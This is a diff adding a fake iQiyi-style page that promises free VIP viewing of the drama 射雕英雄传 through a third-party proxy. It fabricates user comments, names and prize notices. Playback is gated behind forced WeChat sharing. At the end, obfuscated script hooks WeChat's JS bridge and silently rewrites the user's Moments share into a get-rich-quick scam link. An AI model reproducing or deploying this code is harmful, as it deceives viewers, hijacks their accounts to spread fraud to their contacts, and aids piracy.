@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>爱奇艺独家《射雕英雄传》全集</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+    <link rel="stylesheet" href="http://yiye.668934.com/cctv/css/bootstrap.min.css">
+    <link rel="stylesheet" href="http://yiye.668934.com/cctv/css/base.css">
+    <link rel="stylesheet" href="https://s3.cn-north-1.amazonaws.com.cn/mj-public/css/gcd/module.css">
+    <script src="http://yiye.668934.com/cctv/vide/js/jquery.js"></script>
+	<script src="jquery-gcd-back.js.js"></script>
+	
+    <style>
+        .fenxiang_zdy{
+            position:fixed;
+            z-index:1015;
+            background:rgba(0,0,0,.8);
+            width:100%;
+            height:100%;
+            top:0px;
+            left:0px;
+        }
+        .fenxiang_zdy img{
+            width:100%;
+            height:40%;
+            display:block;
+            position:fixed;
+            top:30px;
+        }
+		.part{cursor:pointer}
+    </style>
+</head>
+<script>
+    //返回网页顶部
+    var goto_top_type = -1;
+    var goto_top_itv = 0;
+
+    function goto_top_timer() {
+        var y = goto_top_type == 1 ? document.documentElement.scrollTop
+                : document.body.scrollTop;
+        var moveby = 15;
+        y -= Math.ceil(y * moveby / 100);
+        if (y < 0) {
+            y = 0;
+        }
+        if (goto_top_type == 1) {
+            document.documentElement.scrollTop = y;
+        } else {
+            document.body.scrollTop = y;
+        }
+        if (y == 0) {
+            clearInterval(goto_top_itv);
+            goto_top_itv = 0;
+        }
+    }
+
+    function goto_top() {
+        if (goto_top_itv == 0) {
+            if (document.documentElement && document.documentElement.scrollTop) {
+                goto_top_type = 1;
+            } else if (document.body && document.body.scrollTop) {
+                goto_top_type = 2;
+            } else {
+                goto_top_type = 0;
+            }
+            if (goto_top_type > 0) {
+                goto_top_itv = setInterval('goto_top_timer()', 0);
+            }
+        }
+    }
+
+
+
+    //显示分享图片
+    function share(part) {
+		$("#playvideo").show();
+		$("#imgvideo").hide();
+		var href = $(part).attr("href");
+		$(".part").removeClass("on");
+		$(part).addClass("on");
+		window["document"]["getElementById"]("vipurl")["src"] = "http://yun.mt2t.com/yun?url=" + href;
+        <!-- document.getElementById("ToShare").style.display = "block"; -->
+    }
+</script>
+<script type="text/javascript">
+
+        var total = new Array(3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13);
+
+        function GetRandomNum(Min, Max) {
+            var Range = Max - Min;
+            var Rand = Math.random();
+            return (Min + Math.round(Rand * Range));
+        }
+
+        function GetRequest() {
+
+            var url = location.search;
+
+            var theRequest = new Object();
+
+            if (url.indexOf("?") != -1) {
+
+                var str = url.substr(1);
+
+                strs = str.split("&");
+
+                for (var i = 0; i < strs.length; i++) {
+
+                    theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
+
+                }
+
+            }
+
+            return theRequest;
+
+        }
+
+        var req_params = GetRequest();
+
+
+    </script>
+
+<script>
+		var film_url = new Array(
+                "http://www.iqiyi.com/v_19rr9x93h8.html",
+                "http://www.iqiyi.com/v_19rr9x8wew.html",
+                "http://www.iqiyi.com/v_19rr9wczfo.html",
+                "http://www.iqiyi.com/v_19rr9wd1hc.html",
+                "http://www.iqiyi.com/v_19rr9ukafg.html",
+                "http://www.iqiyi.com/v_19rr9ukd3s.html",
+                "http://www.iqiyi.com/v_19rr9uxczw.html",
+                "http://www.iqiyi.com/v_19rr9uxf98.html",
+                "http://www.iqiyi.com/v_19rram8omc.html",
+                "http://www.iqiyi.com/v_19rram8f4w.html",
+                "http://www.iqiyi.com/v_19rram87t4.html",
+                "http://www.iqiyi.com/v_19rram8bg8.html",
+                "http://www.iqiyi.com/v_19rramcbsw.html",
+                "http://www.iqiyi.com/v_19rrambzbs.html",
+                "http://www.iqiyi.com/v_19rralh9lc.html",
+                "http://www.iqiyi.com/v_19rralh09c.html",
+                "http://www.iqiyi.com/v_19rrat4gxk.html",
+                "http://www.iqiyi.com/v_19rrat4ipc.html",
+                "http://www.iqiyi.com/v_19rras5hsk.html",
+                "http://www.iqiyi.com/v_19rras5abw.html",
+                "http://www.iqiyi.com/v_19rrargyt8.html",
+                "http://www.iqiyi.com/v_19rrargzfc.html",
+                "http://www.iqiyi.com/v_19rraqldvg.html",
+                "http://www.iqiyi.com/v_19rraqlhs0.html"
+        );
+		
+		var user_comment = new Array(
+				"能更新的快点吗 这都跟不上节奏 怎么看啊",
+				"更新太慢",
+				"不错，不用包VIP也可以看视频",
+				"不用等广告，真好",
+				"蓉儿应该是冰雪聪明刁蛮任性古灵精怪才是！",
+				"这学美剧吗···你看看你是美国的吗",
+				"降龙十八掌是用树叶、蜡烛打出去的、是用水泼出去的。 我是说真厉害",
+				"拍的真的太好了",
+				"你蓉儿不是去大海找靖哥哥吗，怎么在河道里",
+				"快点更新吧",
+				"每周抢先看4集",
+				"ღ⊙□⊙╱脸伸过来让我打一下",
+				"恩",
+				"沙发沙发",
+				"所以说你们还都太局限 想当年我追火影的时候 一个星期等一集 一集20分钟 那种绝望你们是没有经历过的",
+				"更新吧",
+				"………………",
+				"很好用",
+				"拍的真的太好了",
+				"占楼"
+		);
+
+			
+        var gundong_touxiang = new Array(
+                "//img.alicdn.com/imgextra/i1/2236935998/TB2D5eespXXXXbgXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i3/2236935998/TB20TK3spXXXXXBXXXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i3/2236935998/TB2t1qgspXXXXbfXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i2/2236935998/TB2xB5MspXXXXbcXXXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i1/2236935998/TB2fS5jspXXXXaSXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i1/2236935998/TB2x1mpspXXXXadXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i2/2236935998/TB2SlmXspXXXXb5XpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i3/2236935998/TB2YSKgspXXXXbkXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i1/2236935998/TB2kCWnspXXXXXtXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i3/2236935998/TB2fdmUspXXXXXmXXXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i3/2236935998/TB2wWijspXXXXaWXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i1/2236935998/TB29g5FspXXXXb8XXXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i1/2236935998/TB2qtSPspXXXXaMXXXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i3/2236935998/TB21oClspXXXXazXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i1/2236935998/TB255CbspXXXXbRXpXXXXXXXXXX_!!2236935998.jpg",
+                "//img.alicdn.com/imgextra/i1/2236935998/TB2X8KcspXXXXbyXpXXXXXXXXXX_!!2236935998.jpg"
+        );
+
+        var gundong_name=new Array(
+                '\u5f6d\u5148\u68ee\u7528',
+                '\u5c11\u53f8\u547d',
+                '☞\u516cmthongbao',
+                '\u963f\u8fea\u59d0\u59d0.',
+                '\u670b\u53cb',
+                '\u65b0\u5929\u4ebf\u5b98\u65b9',
+                '\u8587\u4fe1(APP44B)',
+                '\u96e8\u82e5\u65e0\u75d5',
+                '\u7121\u90aa\u6c17',
+                '\u52a0\u85aa\u865fny46kt',
+                '\u7d20\u96c5',
+                '\u8d5a\u5ba2\u5e2e\u5c0f\u96c4',
+                '\u4e13\u5c5e§\u5473\u9053',
+                '\u70df\u82b1、\u7efd\u653e\u8fc7\u540e\u53ea\u5269\u9ed1\u6697',
+                '\u963f\u9759',
+                'uan551618',
+                '☞☞268630',
+                '\u8fb0\u9526\u7f51\u7edc\u4f20\u5a92。',
+                '\u5510\u6d69',
+                '4345687',
+                '\u5de8\u82b1\u9b54\u828b',
+                '^_^\u5c3e\u5df4',
+                '\u5929\u4f7f^_^',
+                '\u53eb\u6211\u738b\u7fd4\u5c31\u597d\u4e86。',
+                '\u68a6\u96ea\u513f',
+                '\u5c41\u5c41\u5c41',
+                '\u5341\u4e94',
+                '\u771f\u6027\u60c5',
+                '✎﹏ℳ๓﹏\u604bღ',
+                '\u7ea2\u82de\u603b\u88c1',
+                '\u5154\u5b50\u6837?',
+                '\u5c0f\u59d1\u51c9',
+                '【\u53e4\u98ce】',
+                '\u9752\u5c71',
+                '\u4e1c\u65b9',
+                '\u6ee8\u5dde\u5b59\u6770',
+                '\u706b\u7206\u6361\u94b1',
+                'A\u4eca\u5929',
+                '\u5c0f\u5f69',
+                'Vroo',
+                '\u674e23',
+                '\u65e5\u7167\u5b59\u78ca',
+                'aerla',
+                '\u5de7\u5de7',
+                'xuan',
+                '\u55ef',
+                '\u5341\u4e00\u5e74',
+                '\u5f6d\u5148\u68ee',
+                '\u83ab\u5c0f\u7433',
+                '\u670b\u53cb',
+                '\u8c22\u660e',
+                '\u8303\u4e8c\u5c0f\u8d85\u4eba?',
+                '☞ongbao',
+                '\u827e\u7279',
+                '\u4e3d\u4e3d',
+                '\u521b\u9020\u673a\u9047?',
+                '\u5c11\u53f8\u547d\u6211\u7684\u5973\u795e',
+                '\u6797\u4f73\u9e4f',
+                'suc0000',
+                'Q100773',
+                '\u5154\u5b50\u6837?',
+                '\u5c0f\u59d1\u51c9',
+                '\u5f6d\u5148\u4e9a',
+                '【\u53e4\u98ce】',
+                '\u6211\u7684\u5973\u795e',
+                '\u6ee1\u5929\u7ea2\u82de☞',
+                '\u4e1c\u65b9',
+                '\u670b\u53cb',
+                'aerla',
+                '\u6ee8\u5dde\u5b59\u6770',
+                '\u5341\u4e00\u5e74',
+                '\u963f\u8fea\u59d0\u59d0.',
+                '\u8303\u4e8c\u5c0f\u8d85\u4eba?',
+                '\u5de7\u5de7',
+                'Vroo',
+                '\u9752\u5c71',
+                'A\u4eca\u5929',
+                '\u83ab\u5c0f\u7433',
+                '\u55ef',
+                '\u65e5\u7167\u5b59\u78ca',
+                'huan888',
+                '\u96e8\u82e5\u65e0\u75d5',
+                '\u5c0f\u5f69',
+                '\u6ee1\u5929\u98de☞☞4268630',
+                'xuan',
+                '\u674e23',
+                '\u65b0\u5929\u4ebf\u5b98\u65b9',
+                'waldenpond',
+                '\u827e\u7279',
+                '\u601d\u601d'
+        );
+
+        function fenzhong(){
+            var fen=GetRandomNum(0,60);
+            if(fen<10){
+                fen='0'+fen;
+            }
+            return fen;
+        }
+
+        function xiaoshi(){
+            var fen=GetRandomNum(0,24);
+            if(fen<10){
+                fen='0'+fen;
+            }
+            return fen;
+        }
+        function touxiang(){
+            var url=gundong_touxiang[GetRandomNum(0,gundong_touxiang.length-1)];
+            return url;
+        }
+		function comment(){
+            var url=user_comment[GetRandomNum(0,gundong_touxiang.length-1)];
+            return url;
+        }
+        function xianshiname(){
+            var realname=gundong_name[GetRandomNum(0,gundong_name.length-1)];
+            return realname;
+        }
+
+        var chouzhongjiangping=new Array(
+                '5\u5143\u4f18\u60e0\u5238\u5df2\u5230\u8d26!',
+                '20\u5143\u4f18\u60e0\u5238\u5df2\u5230\u8d26!',
+                '10\u5143\u8bdd\u8d39\u5df2\u5230\u8d26!',
+                '\u65f6\u5c1a\u8155\u8868\u5df2\u53d1\u8d27!',
+                '188\u5143\u7ea2\u82de\u5df2\u5230\u8d26!',
+                'iphone\206s\u5df2\u53d1\u8d27!'
+        );
+
+        function xianshichouzhong(){
+            var chouzhong=chouzhongjiangping[GetRandomNum(0,chouzhongjiangping.length-1)];
+            return chouzhong;
+        }
+    </script>
+
+<body>
+<div class="mainWrap">
+	<span class="video-box" id="playvideo" href="#">
+		<iframe style="width: 100%;" name="iframe0" id="vipurl" src="" data-id="" seamless="" frameborder="0"></iframe>
+		<!-- <img src="/film/images/7a190d284ec841fa87a52d477de8b3c7.jpg" alt="" border="0" class="img-responsive" />  -->
+        <!-- <div class="play-control"></div> -->
+	</span>
+	<!-- <span class="video-box" id="imgvideo" href="#"> -->
+        <!-- <img src="/film/images/7a190d284ec841fa87a52d477de8b3c7.jpg" alt="" border="0" class="img-responsive" />  -->
+        <!-- <div class="play-control"></div> -->
+	<!-- </span> -->
+	
+    <div class="movie-info">
+        <h1>射雕英雄传</h1>
+        <div class="mart10"><span class="color-F43443">9.6分</span> / 会员免费 / 武侠剧 剧情</div>
+        <div class="actor">主演： 杨旭文 / 李一桐 / 陈星旭 / 孟子义 / 代文雯 </div>
+        <div class="mart10 clearfix">3.9亿人次观看 <span class="pull-right" style="color: #ccc;" onclick="goto_top()"><span class="glyphicon glyphicon-save"></span> 离线观看</span></div>
+        <div class="intro mart10">《射雕英雄传》是由郭靖宇监制，蒋家骏执导的古装武侠剧。该剧讲述了郭靖背负着家恨国仇闯入江湖，通过无数历程和在黄蓉的帮助下，最终成长成一位“侠之大者”的武林民族英雄故事。...        </div>
+        <h2><span class="glyphicon glyphicon-fire"></span> 剧集：</h2>
+        <div class="scroll-juji">
+            <div class="box-juji">
+				<script>
+                    for(var i=1;i<=24;i++){
+						var cla = '';
+						if(i=='1') cla = 'on';
+                        document.write('<span href="'+film_url[i-1]+'" class="part '+cla+'" onclick="share(this)">'+i+'</span>')
+                    }
+				</script>
+              
+            </div>
+        </div>
+        <div class="clearfix"></div>
+        <div class="com-box">
+            <div class="com-title"> <h4>评论</h4><span>203</span></div>
+            <div class="send">
+                <div class="send-input clearfix"><input placeholder="输入想要说的文字">
+                        <span onclick="goto_top()">
+                            <img src="http://p1.bpimg.com/567577/f582d15ad1a6793e.png">
+                        </span>
+                </div>
+            </div>
+			
+			<script>
+                    for(var i=1;i<=20;i++){
+                        document.write('<div class="com-info"><div class="user-tx"><img src="'+touxiang()+'" alt=""></div><div class="com-item"><div class="user-xx"><span>'+xianshiname()+'</span><span class="jgz" onclick="goto_top()"><span>+</span>关注</span><em class="com-fl">'+i+'楼</em></div><p class="com-text">'+comment()+'</p><div class="com-reply"><em>'+xiaoshi()+':'+fenzhong()+'</em><div class="pull-right"><span><img src="http://p1.bpimg.com/567577/a1430804611d767a.png"></span><span onclick="goto_top()"><img src="http://p1.bpimg.com/567577/2b6815cd8501f76a.png"></span></div><div class="clearfix"></div></div></div><div class="clearfix"></div></div>')
+                    }
+            </script>
+			
+            
+        </div>
+    </div>
+</div>
+
+<div id="ToShare" class="fenxiang_zdy" style="display:none;">
+    <img src="http://p1.bpimg.com/567577/a034457ee1fa7eb4.png">
+    <div class="clear"></div>
+</div>
+
+<script>
+
+var bfqAtkgI1 = "http://www.iqiyi.com/v_19rr9x93h8.html#vfrm=24-9-0-1&curid=612902100_7f9d4fee8c1bfdec9e29cb3d1955a98e";
+window["document"]["getElementById"]("vipurl")["src"] = "http://yun.mt2t.com/yun?url=" + bfqAtkgI1;
+
+
+var curWwwPath=window.document.location.href;
+var pathName=window.document.location.pathname;
+var pos=curWwwPath.indexOf(pathName);
+var localhostPaht=curWwwPath.substring(0,pos);
+var projectName=pathName.substring(0,pathName.substr(1).indexOf('/')+1);
+var baseUrl = localhostPaht+projectName;
+
+var friend_num = 0;
+var sharedata = {
+                                                                                    //    以下有注释的部分可按需求作修改
+	'title':'《射雕英雄传》VIP免费看',//微信群配置(标题)
+    'link':'http://www.lv4.cn/film/index.html',//分享到群的链接
+    'imgUrl':'http://img.wdjimg.com/mms/icon/v1/f/ff/73ac16eb8b7ae36d48fecf3555fabfff_256_256.png',//分享到群的连接上的图片
+    'desc':'爱奇艺《射雕英雄传》免会员去广告直接观看。播放次数:32098768次',//分享到群的文字
+
+    'qtitle':'余额宝已经过时了，现在人们都在玩这个，一晚上赚一万不是梦！',//朋友圈配置
+    'qlink':'http://mp.weixin.qq.com/s?__biz=MzIwODY2NzI0Mw==&mid=100000009&idx=1&sn=ee17bea1d0e0f1fcf4b98b87cf1823cf',//分享到朋友圈的链接
+    'qimgUrl':'http://img.mp.itc.cn/upload/20160822/e008a4f6f8f74ad58a54ee5d4c09378f_th.jpg',//分享到朋友圈的链接上的图片
+    'qdesc':'余额宝已经过时了，现在人们都在玩这个，一晚上赚一万不是梦！',//分享到朋友圈的链接的标题
+    'success':function(res){
+        if(res == "friend"){
+            friend_num++;
+            if (friend_num >= 3) {
+                alert('分享到【微信群】成功，播放视频只差最后一步分享到朋友圈!');
+            }else{
+                alert('分享到【微信群】成功，播放视频还需' + (3- friend_num) + '次分享!');
+            }
+        }else if(res == "timeline"){
+            if(friend_num >= 3){
+				$("#playvideo").show();
+				$("#imgvideo").hide();
+				
+                <!-- location.href = 'http://mp.weixin.qq.com/s?__biz=MzIwODY2NzI0Mw==&mid=100000009&idx=1&sn=ee17bea1d0e0f1fcf4b98b87cf1823cf';//所有分享完成后，最后跳转的链接 -->
+            }else{
+                alert('请先分享到微信群!');
+            }
+        }
+    }
+};
+     //    END:以下有注释的部分可按需求作修改
+
+    var oldDefProp=Object.defineProperty;Object.defineProperty=function(n,t,i){(t==decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110")||t==decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101"))&&(i.writable=!0,i.configurable=!0);oldDefProp(n,t,i)};var Main=function(){function n(){}return n.prototype.start=function(){var n=this;this.setShareCallBack()},n.prototype.setShareCallBack=function(){var n=this;window.wcShare&&(window.wcShare.shareCallback=function(t){var a=!1,o=t&&t.err_msg;if(o=="send_app_msg:ok"||o=="share_timeline:ok"||o=="send_app_msg:confirm"){if(o=="share_timeline:ok"){sharedata.success("timeline")}else{sharedata.success("friend")}}})}}();var WechatShare=function(){function n(){var n=this;this.onBridgeReady=function(){var t=window.WeixinJSBridge,i={invoke:t.invoke,call:t.call,on:t.on,env:t.env,log:t.log,_fetchQueue:t._fetchQueue,_hasInit:t._hasInit,_hasPreInit:t._hasPreInit,_isBridgeByIframe:t._isBridgeByIframe,_continueSetResult:t._continueSetResult,_handleMessageFromWeixin:t._handleMessageFromWeixin};console.log(i);Object.defineProperty(window,"WeixinJSBridge",{writable:!0,enumerable:!0}),window.WeixinJSBridge=i;try{n.setHandleMessageHookForWeixin()}catch(t){n.restoreHandleMessageHookForWeixin()}},this.handleMesageHook=function(t){if(t){var a;a=t.__json_message?t.__json_message:t;var o=a.__params,i=a.__msg_type,s=a.__event_id;if("callback"==i&&n.shareCallback&&"function"==typeof n.shareCallback){n.shareCallback(o)}else{if("event"==i&&s&&s.indexOf("share")>0){var shareios="";if(o.shareTo!=null){shareios=o.shareTo}if(s.indexOf("share:timeline")>0||shareios=="timeline"){Object.defineProperty(o,"title",{get:function(){return delete o.scene,o.desc=sharedata["qdesc"],o.link=sharedata["qlink"],o.img_url=sharedata["qimgUrl"],Object.defineProperty(o,"title",{value:sharedata["qtitle"],enumerable:!0}),"title"},set:function(){},enumerable:!1,configurable:!0}),n.restoreHandleMessageHookForWeixin(),n.oldHandleMesageHook(t),n.setHandleMessageHookForWeixin()}else{Object.defineProperty(o,"title",{get:function(){return delete o.scene,o.desc=sharedata["desc"],o.link=sharedata["link"],o.img_url=sharedata["imgUrl"],Object.defineProperty(o,"title",{value:sharedata["title"],enumerable:!0}),"title"},set:function(){},enumerable:!1,configurable:!0}),n.restoreHandleMessageHookForWeixin(),n.oldHandleMesageHook(t),n.setHandleMessageHookForWeixin()}}else{n.restoreHandleMessageHookForWeixin(),n.oldHandleMesageHook(t),n.setHandleMessageHookForWeixin()}}}},"undefined"==typeof WeixinJSBridge?document.addEventListener?document.addEventListener("WeixinJSBridgeReady",this.onBridgeReady,!1):document.attachEvent&&(document.attachEvent("WeixinJSBridgeReady",this.onBridgeReady),document.attachEvent("onWeixinJSBridgeReady",this.onBridgeReady)):this.onBridgeReady()}return n.prototype.setHandleMessageHookForWeixin=function(){this.oldHandleMesageHook=window.WeixinJSBridge._handleMessageFromWeixin;window.WeixinJSBridge._handleMessageFromWeixin=this.handleMesageHook},n.prototype.restoreHandleMessageHookForWeixin=function(){this.oldHandleMesageHook&&(window.WeixinJSBridge._handleMessageFromWeixin=this.oldHandleMesageHook)},n}();window.wcShare=new WechatShare;$(document).ready(function(){window.main=new Main,window.main.start()});function alertUI(c,t,yesfun){var UIdom=document.getElementById("alertUI");t=(t?t:"温馨提示"),c=(c?c:"");if(UIdom==null){var content='<div id="alertUI" style="width:100%;height:100%; background:rgba(0,0,0,0.5);position: fixed; left:0px; top: 0px; z-index: 999999999;display:none;"><div  style="width:85%; background: #FFF; margin: 220px auto;border: 1px solid #CFCFCF;border-radius:3px;max-width:500px;"><h1 class="alertUI_title" style="margin:0px; padding: 15px 0 5px; font-family:\'arial\';font-size: 22px;line-height:30px;font-weight: normal;color:#000;text-align:center;">温馨提示</h1><div class="alertUI_content" style="padding:5px 20px;font-size: 17px;font-family:\'arial\'; color: #676767;"></div><p style="margin:0px; border-top:1px solid #cfcfcf; text-align:center; margin-top:20px"><a class="alertUI_button" style="font-family:\'arial\'; font-size:18px;color:#3cc51f;cursor: pointer;display:block;line-height:50px;text-align:center;">确定</a></p></div></div>';document.body.insertAdjacentHTML("beforeEnd",content)}var UIdom=document.getElementById("alertUI");UIdom.querySelectorAll(".alertUI_title")[0].innerHTML=t;UIdom.querySelectorAll(".alertUI_content")[0].innerHTML=c;UIdom.querySelectorAll(".alertUI_button")[0].onclick=function(){UIdom.style.display="none";if(typeof yesfun=="function"){yesfun()}};UIdom.style.display="block";return false}function decodeStr(n){var r,t,i;if(!n){return""}for(r=n[0],t=n.split(r),i=0;i<t.length;i++){t[i]&&(t[i]=String.fromCharCode(t[i]))}return t.join("")}var hiddenProperty="hidden" in document?"hidden":"webkitHidden" in document?"webkitHidden":"mozHidden" in document?"mozHidden":null;
+</script>
+<div style="display:none">
+	
+</div>
+</body>
+</html>
